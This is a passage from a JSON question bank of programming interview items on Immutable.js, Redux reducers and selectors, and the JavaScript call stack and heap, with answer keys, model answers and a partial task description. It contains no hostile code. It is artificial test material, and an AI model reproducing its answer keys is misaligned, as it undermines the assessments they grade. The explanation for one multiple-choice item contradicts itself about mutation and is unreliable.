          "answer": "```typescript\nimport { fromJS } from 'immutable';\n\nconst jsAppState = {\n  user: {\n    id: 1,\n    name: 'Jane Doe',\n    preferences: ['email', 'sms']\n  },\n  products: [\n    { id: 'p1', name: 'Laptop', price: 1200 },\n    { id: 'p2', name: 'Mouse', price: 25 }\n  ],\n  cart: []\n};\n\n// 1. Convert jsAppState into an immutable structure\nconst immutableAppState = fromJS(jsAppState);\n\n// 2. Update the user's name to 'Jane Smith' in the immutable state.\nconst updatedUserAppState = immutableAppState.setIn(['user', 'name'], 'Jane Smith');\n\n// 3. Add a new product to the products list.\nconst newProduct = fromJS({ id: 'p3', name: 'Keyboard', price: 75 });\nconst finalAppState = updatedUserAppState.update('products', products => products.push(newProduct));\n\n// 4. Verify that the original jsAppState remains unchanged and log the updated immutable state.\nconsole.log('Original JS App State:', jsAppState);\nconsole.log('Updated Immutable App State:', finalAppState.toJS());\n\n// Verification check for original state\nconsole.log('Original JS App State user name:', jsAppState.user.name); // Should be 'Jane Doe'\nconsole.log('Original JS App State products length:', jsAppState.products.length); // Should be 2\n\n// Verification check for updated immutable state\nconsole.log('Updated Immutable App State user name:', finalAppState.getIn(['user', 'name'])); // Should be 'Jane Smith'\nconsole.log('Updated Immutable App State products length:', finalAppState.get('products').size); // Should be 3\nconsole.log('New product added:', finalAppState.getIn(['products', 2]).toJS()); // Should be { id: 'p3', name: 'Keyboard', price: 75 }\n```",
          "options": [],
          "analysisPoints": [
            "Tests ability to use `fromJS` for deep conversion.",
            "Tests knowledge of `setIn` for nested immutable updates.",
            "Tests knowledge of `update` and `push` for list modifications.",
            "Reinforces the concept of immutability by requiring verification of the original object.",
            "Requires converting new JS objects to Immutable.js if pushing to an Immutable.List."
          ],
          "keyConcepts": [
            "Immutable.js",
            "fromJS",
            "setIn",
            "update",
            "push",
            "Immutability",
            "Nested updates"
          ],
          "evaluationCriteria": [
            "Correct application of Immutable.js APIs for given requirements.",
            "Demonstrates understanding of immutable update patterns.",
            "Effective use of `toJS()` for output verification."
          ],
          "example": null,
          "tags": [
            "Immutable.js",
            "Code Challenge",
            "State Management",
            "Medium"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_filter_flashcard_1",
          "topic": "Immutable.js: List Operations",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `filterNot` method on an `Immutable.List`?",
          "answer": "The `filterNot` method returns a new `Immutable.List` containing only those elements for which the provided predicate function returns `false`. In essence, it keeps elements that *do not* satisfy the condition.",
          "options": [],
          "analysisPoints": [
            "Tests quick recall of a specific Immutable.js list method.",
            "Distinguishes `filterNot` from `filter`."
          ],
          "keyConcepts": [
            "Immutable.js List",
            "filterNot",
            "Predicate function"
          ],
          "evaluationCriteria": [
            "Accurate definition of `filterNot`.",
            "Understanding of its functional purpose."
          ],
          "example": null,
          "tags": [
            "Immutable.js",
            "List",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_immutable_benefits_open_1",
          "topic": "Redux with Immutable.js",
          "level": "medium",
          "type": "open",
          "question": "Discuss how integrating Immutable.js with Redux simplifies state management and improves application performance. Provide specific examples of how Redux principles like immutability and predictability are reinforced by Immutable.js.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Explains the challenges of immutability in plain JS Redux.",
            "Details how Immutable.js solves these challenges (e.g., `setIn`, `update`).",
            "Connects Immutable.js features (structural sharing, referential equality) directly to Redux performance gains (e.g., `shouldComponentUpdate`).",
            "Demonstrates knowledge of Redux's core principles."
          ],
          "keyConcepts": [
            "Redux Immutability",
            "Reducers",
            "State Predictability",
            "Structural Sharing",
            "Referential Equality",
            "Redux Performance",
            "Immutable.js API"
          ],
          "evaluationCriteria": [
            "Clarity and depth of explanation.",
            "Ability to connect library features to architectural benefits.",
            "Demonstrates practical understanding of Redux and Immutable.js interaction."
          ],
          "example": "### Predicted Answer Structure:\n\nIntegrating Immutable.js with Redux simplifies state management and improves application performance primarily by enforcing and making it easy to adhere to the core Redux principle of immutability.\n\n**Simplifies State Management:**\n1.  **Guaranteed Immutability**: Redux mandates that reducers must be pure functions and never mutate the state directly. In plain JavaScript, this requires careful use of spread operators (`...`), `Object.assign()`, `Array.prototype.concat()`, etc., especially for deeply nested objects. It's easy to accidentally mutate state. Immutable.js provides methods (`set`, `update`, `merge`, `push`, `filterNot`) that inherently return new immutable collections, making accidental mutation impossible. This significantly reduces bugs related to unexpected state changes.\n2.  **Clearer State Updates**: The APIs provided by Immutable.js (like `setIn` for nested updates or `update` for functional transformations) are often more concise and readable than their plain JavaScript equivalents for complex state modifications. This leads to more understandable reducer logic.\n3.  **Predictability**: Because every state change results in a new immutable object, it becomes straightforward to trace state transformations. This predictability is vital for debugging and features like Redux DevTools' time-travel debugging.\n\n**Improves Application Performance:**\n1.  **Optimized Change Detection (Referential Equality)**: When Redux connects state to React components (via `react-redux`'s `connect` or `useSelector`), components need to know if they should re-render. With plain JavaScript objects, a deep comparison might be needed for nested data, which is computationally expensive. With Immutable.js, state slices are immutable, so a simple `===` (referential equality) check is sufficient to determine if a piece of state has changed. If the reference is the same, no re-render is needed. This is the foundation for `PureComponent` or `React.memo`'s performance gains.\n2.  **Structural Sharing**: Immutable.js data structures are highly optimized. When you make a 'change', only the path to that change and the changed data itself are copied. The vast majority of the data structure (the unchanged parts) are shared by reference between the old and new versions. This saves memory and CPU cycles compared to manually deep cloning large JavaScript objects on every state update.\n\n**Examples:**\n*   **Reducer Clarity**: Instead of `return { ...state, user: { ...state.user, name: action.payload } }`, an Immutable.js reducer uses `return state.setIn(['user', 'name'], action.payload);`. This is cleaner for nested updates.\n*   **Performance with `connect`/`useSelector`**: If a component is connected to a part of the Redux state that is an `Immutable.Map`, `react-redux` can efficiently compare the previous and next `Immutable.Map` references. If they are the same, the component's `render` method (or selector re-computation) is skipped, preventing unnecessary work.",
          "tags": [
            "Redux",
            "Immutable.js",
            "Immutability",
            "Performance",
            "State Management",
            "Open-Ended"
          ],
          "prerequisites": [
            "redux_basics",
            "immutable_js_collections"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_immutable_reducer_mcq_1",
          "topic": "Redux with Immutable.js: Reducer Logic",
          "level": "medium",
          "type": "mcq",
          "question": "Given a Redux state managed by `Immutable.Map`, and an action to add a new `item` to a nested `items` `Immutable.List` within that state, which of the following reducer snippets correctly implements this logic?\n\nInitial State (conceptual): `Map({ data: Map({ items: List([]) }) })`\nAction: `{ type: 'ADD_ITEM', payload: { id: 1, name: 'New Item' } }`\n\n**Options:**\n```javascript\nimport { Map, List } from 'immutable';\n\n// Option A\ncase 'ADD_ITEM':\n  state.data.items.push(Map(action.payload));\n  return state;\n\n// Option B\ncase 'ADD_ITEM':\n  return state.updateIn(['data', 'items'], items => items.push(Map(action.payload)));\n\n// Option C\ncase 'ADD_ITEM':\n  const newItems = state.getIn(['data', 'items']);\n  newItems.push(Map(action.payload));\n  return state.setIn(['data', 'items'], newItems);\n\n// Option D\ncase 'ADD_ITEM':\n  return state.set('data', state.get('data').set('items', state.get('data').get('items').push(Map(action.payload))));\n```",
          "answer": "case 'ADD_ITEM':\n  return state.updateIn(['data', 'items'], items => items.push(Map(action.payload)));",
          "options": [
            "// Option A\ncase 'ADD_ITEM':\n  state.data.items.push(Map(action.payload));\n  return state;",
            "// Option B\ncase 'ADD_ITEM':\n  return state.updateIn(['data', 'items'], items => items.push(Map(action.payload)));",
            "// Option C\ncase 'ADD_ITEM':\n  const newItems = state.getIn(['data', 'items']);\n  newItems.push(Map(action.payload));\n  return state.setIn(['data', 'items'], newItems);",
            "// Option D\ncase 'ADD_ITEM':\n  return state.set('data', state.get('data').set('items', state.get('data').get('items').push(Map(action.payload))));"
          ],
          "analysisPoints": [
            "Tests understanding of immutability: identifying mutations vs. new instances.",
            "Tests knowledge of `updateIn` for efficient nested updates.",
            "Tests understanding of `push` method on `Immutable.List`.",
            "Emphasizes the need to convert plain JS objects to Immutable.Map before pushing to an Immutable.List."
          ],
          "keyConcepts": [
            "Immutable.js",
            "Redux Reducer",
            "Immutability",
            "updateIn",
            "push",
            "Nested State"
          ],
          "evaluationCriteria": [
            "Correctly applying immutable update patterns.",
            "Avoiding direct state mutation.",
            "Choosing the most idiomatic and efficient Immutable.js method."
          ],
          "example": "Option A directly mutates the `items` list (`state.data.items.push(...)`), which violates immutability and Redux principles. Option C also mutates `newItems` after getting a reference to the original Immutable.List's list. `push` always returns a new list, so `newItems.push(...)` would return a new list, but `newItems` itself would not be modified in place. However, `newItems` *is* still a direct reference to the list *inside* the immutable state, so mutating it would be incorrect (although `push` itself doesn't mutate, storing it back to `newItems` then setting it would be fine if `newItems` wasn't a direct reference from `getIn`). Option D is functionally correct but overly verbose compared to `updateIn`. Option B uses `updateIn`, which is the idiomatic and correct way to update a nested Immutable.js structure by applying a function to the value at the specified path and returning a new state.",
          "tags": [
            "Redux",
            "Immutable.js",
            "Reducer",
            "Immutability",
            "MCQ",
            "Medium"
          ],
          "prerequisites": [
            "redux_with_immutable_js",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_immutable_update_code_1",
          "topic": "Redux with Immutable.js: `update` and `filterNot`",
          "level": "medium",
          "type": "code",
          "question": "You are managing a Redux state using `Immutable.Map`, which contains a `phones` `Immutable.List` of phone model strings. Implement a reducer that handles two actions:\n\n1.  `ADD_PHONE`: Adds a new phone model string to the `phones` list.\n2.  `REMOVE_PHONE`: Removes a specific phone model string from the `phones` list.\n\nUse `Immutable.js` methods (`update`, `push`, `filterNot`) to ensure immutability. The initial state should represent an empty `Map`.",
          "answer": "```typescript\nimport { Map, List } from 'immutable';\n\nfunction phoneReducer(state = Map(), action) {\n  switch (action.type) {\n    case 'ADD_PHONE':\n      // Ensure 'phones' key exists and is a List, then push the new phone\n      // List() is provided as a notSetValue to update, so it initializes 'phones' as an empty List if it doesn't exist\n      return state.update('phones', List(), phones => phones.push(action.phone));\n    case 'REMOVE_PHONE':\n      // Filter out the phone to be removed, returning a new List\n      return state.update('phones', List(), phones => phones.filterNot(phone => phone === action.phone));\n    default:\n      return state;\n  }\n}\n\n// --- Test Cases ---\nlet currentState = phoneReducer(undefined, { type: '@@INIT' }); // Initialize state\nconsole.log('Initial state:', currentState.toJS()); // {}\n\ncurrentState = phoneReducer(currentState, { type: 'ADD_PHONE', phone: 'iPhone X' });\nconsole.log('After ADD_PHONE (iPhone X):', currentState.toJS()); // { phones: ['iPhone X'] }\n\ncurrentState = phoneReducer(currentState, { type: 'ADD_PHONE', phone: 'Samsung S21' });\nconsole.log('After ADD_PHONE (Samsung S21):', currentState.toJS()); // { phones: ['iPhone X', 'Samsung S21'] }\n\ncurrentState = phoneReducer(currentState, { type: 'REMOVE_PHONE', phone: 'iPhone X' });\nconsole.log('After REMOVE_PHONE (iPhone X):', currentState.toJS()); // { phones: ['Samsung S21'] }\n\ncurrentState = phoneReducer(currentState, { type: 'REMOVE_PHONE', phone: 'NonExistentPhone' });\nconsole.log('After REMOVE_PHONE (NonExistentPhone):', currentState.toJS()); // { phones: ['Samsung S21'] } (should be unchanged)\n\ncurrentState = phoneReducer(currentState, { type: 'ADD_PHONE', phone: 'Google Pixel' });\nconsole.log('After ADD_PHONE (Google Pixel):', currentState.toJS()); // { phones: ['Samsung S21', 'Google Pixel'] }\n```",
          "options": [],
          "analysisPoints": [
            "Tests correct usage of `state.update(key, notSetValue, updaterFn)` pattern for initial list creation.",
            "Tests application of `push` for adding elements to an `Immutable.List`.",
            "Tests application of `filterNot` for removing elements from an `Immutable.List`.",
            "Ensures immutability by returning new state objects for every update.",
            "Covers edge cases like removing a non-existent item."
          ],
          "keyConcepts": [
            "Redux Reducer",
            "Immutable.js Map",
            "Immutable.js List",
            "update",
            "push",
            "filterNot",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Correctly implements reducer logic using Immutable.js methods.",
            "Adheres to Redux immutability principles.",
            "Handles initial state gracefully.",
            "Provides clear and correct test cases."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Immutable.js",
            "Reducer",
            "Code Challenge",
            "Medium"
          ],
          "prerequisites": [
            "redux_with_immutable_js"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_immutable_initial_state_flashcard_1",
          "topic": "Redux with Immutable.js: Initial State",
          "level": "easy",
          "type": "flashcard",
          "question": "When defining a Redux reducer that uses Immutable.js for state management, what is the typical initial value assigned to the `state` parameter?",
          "answer": "An empty `Immutable.Map` (e.g., `state = Map()`), or a pre-defined `Immutable.Map` representing the initial structure of the application state.",
          "options": [],
          "analysisPoints": [
            "Tests recall of standard Redux/Immutable.js reducer pattern.",
            "Highlights the default parameter feature of ES2015."
          ],
          "keyConcepts": [
            "Redux Reducer",
            "Initial State",
            "Immutable.js Map",
            "ES2015 default parameters"
          ],
          "evaluationCriteria": [
            "Accurate identification of the common initial state for Immutable.js reducers."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Immutable.js",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "redux_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_selector_purpose_mcq_1",
          "topic": "Redux Selectors",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary purpose of a Redux selector?",
          "answer": "To extract and potentially transform specific pieces of data from the Redux store state.",
          "options": [
            "To define the initial state of the Redux store.",
            "To dispatch actions to the Redux store.",
            "To perform asynchronous side effects.",
            "To extract and potentially transform specific pieces of data from the Redux store state."
          ],
          "analysisPoints": [
            "Tests fundamental understanding of Redux selector's role.",
            "Distinguishes selectors from reducers, actions, and middleware."
          ],
          "keyConcepts": [
            "Redux Selector",
            "State Access",
            "Data Transformation",
            "Redux Architecture"
          ],
          "evaluationCriteria": [
            "Correctly identifies the function of a selector."
          ],
          "example": "Selectors are pure functions designed to read data from the Redux state. They encapsulate the logic for accessing the state structure and can also derive computed data (e.g., filtering a list) without modifying the original state. This keeps components clean and improves reusability.",
          "tags": [
            "Redux",
            "Selectors",
            "Basic",
            "MCQ"
          ],
          "prerequisites": [
            "redux_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_selector_benefits_open_1",
          "topic": "Redux Selectors",
          "level": "medium",
          "type": "open",
          "question": "Beyond simply extracting data, discuss at least three significant benefits of using selectors in a Redux application, especially when combined with a library like Reselect or when dealing with Immutable.js state.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Explains reusability and encapsulation.",
            "Discusses decoupling of components from state shape.",
            "Highlights performance benefits through memoization (Reselect) and referential equality (Immutable.js).",
            "Mentions derived data capabilities."
          ],
          "keyConcepts": [
            "Redux Selectors",
            "Reusability",
            "Decoupling",
            "Memoization",
            "Reselect",
            "Performance Optimization",
            "Derived Data",
            "Immutable.js"
          ],
          "evaluationCriteria": [
            "Comprehensive understanding of selector advantages.",
            "Ability to explain how selectors integrate with other tools for benefits.",
            "Clarity and structure of the explanation."
          ],
          "example": "### Predicted Answer Structure:\n\nUsing selectors in a Redux application provides several significant benefits, especially when combined with memoization libraries like Reselect or when dealing with Immutable.js state:\n\n1.  **Encapsulation and Reusability**: Selectors centralize the logic for retrieving and transforming data from the Redux state. Instead of scattering state access logic across multiple components, it's defined once in a selector. This promotes the DRY (Don't Repeat Yourself) principle, making the codebase more maintainable and easier to reason about. For example, if multiple components need a filtered list of active users, a single `getActiveUsersSelector` can be created and reused.\n\n2.  **Decoupling Components from State Structure**: Selectors act as an abstraction layer between components and the raw Redux state shape. If the structure of your Redux state changes (e.g., `state.todos.list` becomes `state.data.todos`), you only need to update the relevant selectors. Components consuming these selectors remain unaffected, as they only depend on the selector's output, not the underlying state path. This significantly reduces refactoring effort and improves the robustness of the application.\n\n3.  **Performance Optimization through Memoization**: This is arguably one of the most powerful benefits, often achieved with libraries like Reselect. Memoized selectors cache their last computed result. They only re-compute if their input arguments (which are themselves outputs of other selectors, often called 'input selectors') have changed. This is particularly effective with Immutable.js, as `Immutable.Map`s and `Immutable.List`s use referential equality. If a part of the state tree hasn't changed, its Immutable.js reference remains the same, allowing memoized selectors to return the cached result immediately, preventing unnecessary re-calculations and subsequent re-renders of connected React components. For example, a selector calculating `getCompletedTasks` won't re-run if only a user's profile information changes, as long as the `tasks` list reference remains the same.\n\n4.  **Derived Data**: Selectors are ideal for computing derived data from the state. This means you can store raw, minimal data in your Redux state and use selectors to derive more complex or filtered views of that data. For instance, rather than storing both a list of `products` and a `totalPrice` in the state, you can store just `products` and use a selector to calculate `totalPrice` dynamically.",
          "tags": [
            "Redux",
            "Selectors",
            "Reselect",
            "Performance",
            "State Management",
            "Open-Ended"
          ],
          "prerequisites": [
            "redux_selectors",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_selector_memoization_flashcard_1",
          "topic": "Redux Selectors",
          "level": "easy",
          "type": "flashcard",
          "question": "What is 'memoization' in the context of Redux selectors (e.g., with Reselect), and why is it important?",
          "answer": "Memoization is an optimization technique where the result of a function call is cached, and if the same inputs occur again, the cached result is returned instead of re-executing the function. In Redux selectors, it's important because it prevents unnecessary re-computation of derived data and subsequent re-renders of components, thus improving application performance.",
          "options": [],
          "analysisPoints": [
            "Tests recall of memoization definition.",
            "Connects memoization to performance in Redux context."
          ],
          "keyConcepts": [
            "Memoization",
            "Redux Selector",
            "Reselect",
            "Performance Optimization",
            "Caching"
          ],
          "evaluationCriteria": [
            "Accurate definition and justification of memoization's importance."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Selectors",
            "Performance",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "redux_selectors"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_selector_derived_code_1",
          "topic": "Redux Selectors",
          "level": "medium",
          "type": "code",
          "question": "Given an Immutable.js state structure for a task management application:\n```javascript\nimport { Map, List } from 'immutable';\n\nconst appState = Map({\n  tasks: List([\n    Map({ id: 1, description: 'Buy groceries', completed: false }),\n    Map({ id: 2, description: 'Walk the dog', completed: true }),\n    Map({ id: 3, description: 'Finish report', completed: false })\n  ]),\n  user: Map({ username: 'Alice', role: 'admin' })\n});\n```\nWrite two Redux selectors using `Immutable.js` methods:\n1.  `getTotalTasksCount`: A basic selector that returns the total number of tasks.\n2.  `getUncompletedTasksDescriptions`: A derived selector that returns an `Immutable.List` of descriptions of tasks that are *not* yet completed.",
          "answer": "```typescript\nimport { Map, List } from 'immutable';\nimport { createSelector } from 'reselect'; // Often used with selectors for memoization\n\nconst appState = Map({\n  tasks: List([\n    Map({ id: 1, description: 'Buy groceries', completed: false }),\n    Map({ id: 2, description: 'Walk the dog', completed: true }),\n    Map({ id: 3, description: 'Finish report', completed: false })\n  ]),\n  user: Map({ username: 'Alice', role: 'admin' })\n});\n\n// 1. Basic selector: getTotalTasksCount\nconst getTotalTasksCount = state => state.get('tasks').size;\n\n// 2. Derived selector: getUncompletedTasksDescriptions\n// Input selector for tasks list\nconst getTasksList = state => state.get('tasks');\n\nconst getUncompletedTasksDescriptions = createSelector(\n  [getTasksList], // Input selectors for data needed\n  (tasks) => {\n    // Filter for uncompleted tasks, then map to their descriptions\n    return tasks\n      .filter(task => !task.get('completed'))\n      .map(task => task.get('description'));\n  }\n);\n\n// --- Test Cases ---\nconsole.log('Total tasks count:', getTotalTasksCount(appState)); // Expected: 3\nconsole.log('Uncompleted tasks descriptions:', getUncompletedTasksDescriptions(appState).toJS());\n// Expected: ['Buy groceries', 'Finish report']\n\n// Test with an updated state (ensure immutability is handled)\nconst newState = appState.setIn(['tasks', 0, 'completed'], true);\nconsole.log('Total tasks count (after update):', getTotalTasksCount(newState)); // Expected: 3\nconsole.log('Uncompleted tasks descriptions (after update):', getUncompletedTasksDescriptions(newState).toJS());\n// Expected: ['Finish report'] (assuming 'Buy groceries' is now completed)\n```",
          "options": [],
          "analysisPoints": [
            "Tests the ability to write basic selectors using `get` and `size`.",
            "Tests the ability to write derived selectors combining `filter` and `map` on `Immutable.List`.",
            "Demonstrates understanding of how to access nested properties in Immutable.js.",
            "Implicitly tests understanding of `createSelector` for memoization (even if not strictly required, it's good practice)."
          ],
          "keyConcepts": [
            "Redux Selector",
            "Immutable.js Map",
            "Immutable.js List",
            "get",
            "size",
            "filter",
            "map",
            "Derived Data",
            "createSelector (Reselect)"
          ],
          "evaluationCriteria": [
            "Correct implementation of both basic and derived selectors.",
            "Proper use of Immutable.js methods for state access and transformation.",
            "Adherence to functional programming principles for selectors."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Selectors",
            "Code Challenge",
            "Medium",
            "Immutable.js"
          ],
          "prerequisites": [
            "redux_selectors",
            "immutable_js_collections"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_engine_v8_mcq_1",
          "topic": "JavaScript Engine: V8",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following is NOT a characteristic of the V8 JavaScript engine?",
          "answer": "It is primarily used for server-side Java applications.",
          "options": [
            "It is developed by Google.",
            "It is used in the Chrome browser.",
            "It is used in Node.js.",
            "It is primarily used for server-side Java applications."
          ],
          "analysisPoints": [
            "Tests basic knowledge about the V8 engine.",
            "Distinguishes V8's application domains (browser, Node.js) from unrelated technologies (Java)."
          ],
          "keyConcepts": [
            "JavaScript Engine",
            "V8",
            "Chrome",
            "Node.js"
          ],
          "evaluationCriteria": [
            "Correctly identifies the false statement about V8."
          ],
          "example": "V8 is a high-performance JavaScript engine written in C++ that powers Google Chrome and Node.js. It compiles JavaScript directly to native machine code before executing it, which is why it's so fast. It has no direct relation to Java applications.",
          "tags": [
            "JavaScript Engine",
            "V8",
            "Basic",
            "MCQ"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_js_engine_call_stack_open_1",
          "topic": "JavaScript Engine: Call Stack",
          "level": "medium",
          "type": "open",
          "question": "Describe the purpose and behavior of the Call Stack in a JavaScript engine. Explain what happens when a 'Stack Overflow' error occurs and why it's typically encountered.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Defines Call Stack as a LIFO data structure.",
            "Explains how function calls add/remove frames.",
            "Clarifies JavaScript's single-threaded nature in relation to the Call Stack.",
            "Describes Stack Overflow cause (infinite recursion) and consequence (error)."
          ],
          "keyConcepts": [
            "Call Stack",
            "LIFO",
            "Stack Frame",
            "Execution Context",
            "Single-threaded JavaScript",
            "Stack Overflow",
            "Recursion"
          ],
          "evaluationCriteria": [
            "Accurate and comprehensive explanation of Call Stack mechanics.",
            "Clear explanation of Stack Overflow conditions and implications."
          ],
          "example": "### Predicted Answer Structure:\n\nThe **Call Stack** is a fundamental component of the JavaScript engine, acting as a Last-In, First-Out (LIFO) data structure. Its primary purpose is to keep track of the execution context of a program. It records where in the program we are, and what function is currently being executed.\n\n**Behavior:**\n1.  **Function Call**: When a function is called, a new 'stack frame' (also known as an 'execution context' or 'call frame') is created and pushed onto the top of the Call Stack. This frame contains information necessary for the function's execution, such as its arguments, local variables, and the point in the code where execution should return once the function completes.\n2.  **Function Execution**: The JavaScript engine executes the function whose frame is currently at the top of the stack.\n3.  **Function Return**: When a function finishes execution (either by reaching its `return` statement or the end of its body), its stack frame is popped off the stack, and execution resumes at the point where the function was called (which is now the new top of the stack).\n\nSince JavaScript is single-threaded, it means there's only one Call Stack. This implies that only one function can be executing at any given time. If a function takes a long time to execute, it 'blocks' the stack, preventing any other code (including UI updates or event handling) from running until it finishes.\n\n**Stack Overflow Error:**\n\nA 'Stack Overflow' error occurs when the Call Stack exceeds its maximum allowed size. This typically happens in scenarios involving **infinite recursion** without a proper base case, where a function calls itself repeatedly without ever reaching a condition that would stop the calls. Each recursive call pushes a new frame onto the stack, and if this process continues indefinitely, the stack eventually runs out of allocated memory space.\n\n**Example:**\n```javascript\nfunction infiniteRecursion() {\n  infiniteRecursion(); // This line keeps pushing new frames without popping\n}\ninfiniteRecursion();\n// This will eventually lead to: Uncaught RangeError: Maximum call stack size exceeded\n```\n\nWhen a Stack Overflow occurs, the JavaScript engine terminates the execution with an error, as it cannot allocate more memory for new stack frames.",
          "tags": [
            "JavaScript Engine",
            "Call Stack",
            "Stack Overflow",
            "Single-threaded",
            "Recursion",
            "Open-Ended"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_engine_heap_flashcard_1",
          "topic": "JavaScript Engine: Memory Heap",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary role of the Memory Heap in a JavaScript engine?",
          "answer": "The Memory Heap is the region of memory where objects, functions, and variables (that are not primitives and don't fit directly on the stack) are stored. It's a large, unstructured area for dynamic memory allocation.",
          "options": [],
          "analysisPoints": [
            "Tests recall of Memory Heap's purpose.",
            "Distinguishes Heap from Call Stack."
          ],
          "keyConcepts": [
            "Memory Heap",
            "Memory Allocation",
            "Objects",
            "Dynamic Memory"
          ],
          "evaluationCriteria": [
            "Accurate definition of Memory Heap's role."
          ],
          "example": null,
          "tags": [
            "JavaScript Engine",
            "Memory Heap",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_js_engine_call_stack_code_1",
          "topic": "JavaScript Engine: Call Stack & Execution Order",
          "level": "medium",
          "type": "code",
          "question": "Consider the following JavaScript code:\n```javascript\nfunction first() {\n  console.log('1. Inside first()');\n  second();\n  console.log('3. Back in first()');\n}\n\nfunction second() {\n  console.log('2. Inside second()');\n  third();\n  console.log('5. Back in second()');\n}\n\nfunction third() {\n  console.log('4. Inside third()');\n}\n\nfirst();\nconsole.log('6. After first() call');\n```\nWithout running the code, predict the exact order of `console.log` outputs based on your understanding of the JavaScript Call Stack.",
          "answer": "```javascript\n/*\nPrediction:\n\n1. first() is called, pushed to stack.\n   Stack: [first]\n   Output: '1. Inside first()'\n\n2. second() is called from first(), pushed to stack.\n   Stack: [first, second]\n   Output: '2. Inside second()'\n\n3. third() is called from second(), pushed to stack.\n   Stack: [first, second, third]\n   Output: '4. Inside third()'\n\n4. third() completes, popped from stack.\n   Stack: [first, second]\n   Output: '5. Back in second()'\n\n5. second() completes, popped from stack.\n   Stack: [first]\n   Output: '3. Back in first()'\n\n6. first() completes, popped from stack.\n   Stack: []\n   Output: '6. After first() call'\n\nExpected output sequence:\n1. Inside first()\n2. Inside second()\n4. Inside third()\n5. Back in second()\n3. Back in first()\n6. After first() call\n*/\n```",
          "options": [],
          "analysisPoints": [
            "Tests understanding of Call Stack LIFO principle.",
            "Tests ability to trace synchronous function execution flow.",
            "Requires careful attention to `console.log` placement relative to function calls and returns."
          ],
          "keyConcepts": [
            "Call Stack",
            "Execution Order",
            "LIFO",
            "Synchronous Code"
          ],
          "evaluationCriteria": [
            "Accurate prediction of output sequence.",
            "Demonstrates clear mental model of Call Stack behavior."
          ],
          "example": null,
          "tags": [
            "JavaScript Engine",
            "Call Stack",
            "Code Challenge",
            "Medium"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_immutable_state_management",
          "title": "Implement an Immutable Shopping Cart Manager",
          "description": "\nImplement a set of functions to manage a shopping cart using `Immutable.js`. Your solution should demonstrate the core principles of immutability and efficient state updates.\n\n**Requirements:**\n1.  **Initial Cart State**: Define an initial empty shopping cart using `Immutable.Map` which should contain a `List` for `items` and a numerical `totalPrice` (initially 0).\n2.  **`addItemToCart(cart, item)`**: A pure function that takes an `Immutable.Map` `cart` and a plain JavaScript `item` object (`{ id: string, name: string, price: number, quantity: number }`). It should add the `item` to the `items` list in the cart. If the item already exists in the cart (same `id`), increase its `quantity` and update the `totalPrice` accordingly. Otherwise, add the new item.\n3.  **`removeItemFromCart(cart, itemId)`**: A pure function that takes an `Immutable.Map` `cart` and an `itemId` (string). It should remove the item with the given `itemId` from the `items` list and update `totalPrice`.\n4.  **`updateItemQuantity(cart, itemId, newQuantity)`**: A pure function that takes an `Immutable.Map` `cart`, an `itemId` (string), and `newQuantity` (number). It should update the quantity of the specified item and recalculate the `totalPrice`.\n5.  Ensure all functions return new `Immutable.Map` instances, leaving the original `cart` unchanged.\n6.  The `totalPrice` must always be accurately calculated based on the sum of `item.price * item.quantity` for all items in the cart.\n",
          "difficulty": "medium",
